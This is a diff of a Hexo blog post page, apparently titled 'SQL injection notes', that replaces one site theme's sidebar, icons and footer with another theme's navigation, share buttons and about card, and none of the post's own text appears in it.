-  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
-</svg>
-    <span>NOTICE</span>
-  </div>
-  <div class="widget-body">
-    <p>赛车的终点是赛道的尽头</p>
-  </div>
-</section>
-
-
-      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
-  <div class="widget-title">
-    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
-  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
-</svg>
-    <span>CATEGORYS</span>
-  </div>
-  <div class="widget-body">
-    <ul class="categorys-list">
-      
+            </div>
+        
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2022/03/30/SSRF%E7%AC%94%E8%AE%B0/"
+                    data-tooltip="SSRF笔记"
+                    aria-label="FRÜHER: SSRF笔记"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">FRÜHER</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2022/01/24/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/"
+                    data-tooltip="实用工具"
+                    aria-label="NÄCHSTER: 实用工具"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NÄCHSTER</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Diesen Beitrag teilen"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://example.com/2022/03/24/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"
+                    title="Teilen auf Facebook"
+                    aria-label="Teilen auf Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://example.com/2022/03/24/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"
+                    title="Teilen auf Twitter"
+                    aria-label="Teilen auf Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://example.com/2022/03/24/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"
+                    title="Teilen auf Google Plus"
+                    aria-label="Teilen auf Google Plus"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
     </ul>
-  </div>
-</section>
-
-      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
-  <div class="widget-title">
-    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
-  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
-</svg>
-    <span>TAGS</span>
-  </div>
-  <div class="widget-body">
-    <div class="tags-cloud">
-      <a href="/tags/Writeup/" style="font-size: 15px;" class="tags-cloud-5">Writeup</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;" class="tags-cloud-0">工具</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 20px;" class="tags-cloud-10">笔记</a>
-    </div>
-  </div>
-</section>
-    </div>
-  </article>
 </div>
 
-    <!-- footer container -->
-<footer id="footer" class="footer">
-  <div class="footer-container">
-    
-    <div class="social-icons">
-      
+
         
-      
         
-      
+            
         
-      
-        
-          <a href="https://github.com/ttycp3/" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
-            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
-  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
-</svg>
-          </a>
-        
-      
-        
-          <a href="https://twitter.com/guanquanhong" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
-            <svg class="icon icon-twitter" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
-  <path d="M962.285714 233.142857q-38.285714 56-92.571429 95.428571 0.571429 8 0.571429 24 0 74.285714-21.714286 148.285714t-66 142-105.428571 120.285714-147.428571 83.428571-184.571429 31.142857q-154.857143 0-283.428571-82.857143 20 2.285714 44.571429 2.285714 128.571429 0 229.142857-78.857143-60-1.142857-107.428571-36.857143t-65.142857-91.142857q18.857143 2.857143 34.857143 2.857143 24.571429 0 48.571429-6.285714-64-13.142857-106-63.714286t-42-117.428571l0-2.285714q38.857143 21.714286 83.428571 23.428571-37.714286-25.142857-60-65.714286t-22.285714-88q0-50.285714 25.142857-93.142857 69.142857 85.142857 168.285714 136.285714t212.285714 56.857143q-4.571429-21.714286-4.571429-42.285714 0-76.571429 54-130.571429t130.571429-54q80 0 134.857143 58.285714 62.285714-12 117.142857-44.571429-21.142857 65.714286-81.142857 101.714286 53.142857-5.714286 106.285714-28.571429z"></path>
-</svg>
-          </a>
-        
-      
     </div>
-     
-    <p>&copy; 2022 <a href="/" target="_blank">tty</a></p>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2022 tty. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2022/03/30/SSRF%E7%AC%94%E8%AE%B0/"
+                    data-tooltip="SSRF笔记"
+                    aria-label="FRÜHER: SSRF笔记"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">FRÜHER</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2022/01/24/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/"
+                    data-tooltip="实用工具"
+                    aria-label="NÄCHSTER: 实用工具"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NÄCHSTER</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Diesen Beitrag teilen"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://example.com/2022/03/24/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"
+                    title="Teilen auf Facebook"
+                    aria-label="Teilen auf Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://example.com/2022/03/24/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"
+                    title="Teilen auf Twitter"
+                    aria-label="Teilen auf Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://example.com/2022/03/24/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"
+                    title="Teilen auf Google Plus"
+                    aria-label="Teilen auf Google Plus"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://example.com/2022/03/24/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"
+                        aria-label="Teilen auf Facebook"
+                    >
+                        <i class="fab fa-facebook" aria-hidden="true"></i><span>Teilen auf Facebook</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=http://example.com/2022/03/24/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"
+                        aria-label="Teilen auf Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>Teilen auf Twitter</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://plus.google.com/share?url=http://example.com/2022/03/24/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"
+                        aria-label="Teilen auf Google Plus"
+                    >
+                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>Teilen auf Google Plus</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+
+
+            
+        </div>
+        
+
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
+        
+            <h4 id="about-card-name">tty</h4>
+        
+            <div id="about-card-bio"><p>author.bio</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>author.job</p>
+
+            </div>
+        
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+
+<script src="/assets/js/script-gtexuswox0xbgkrqjf4bywpuyxsc2ri7ghrhv1qivj4cwnczc8qo9phljx3s.min.js"></script>
+
+<!--SCRIPTS END-->
+
 
     
 
-    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
-
-    <p>
-      <a href="javascript:;" id="theme-light">🌞 浅色</a>
-      <a href="javascript:;" id="theme-dark">🌛 深色</a>
-      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
-    </p>
-  </div>
-</footer>
-  </div>
-
-  <div class="back-to-top-fixed soft-size--round soft-style--box">
-    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
-      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
-      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
-      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
-    </svg>
-  </div>
-
-  
-  <!-- aplayer -->
-
-
-<!-- dplayer -->
 
 
 
-
-  
-
-
-  
-
-
-  
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-  
-  <!-- 尾部用户自定义相关内容 -->
-</body>
+    </body>
 </html>
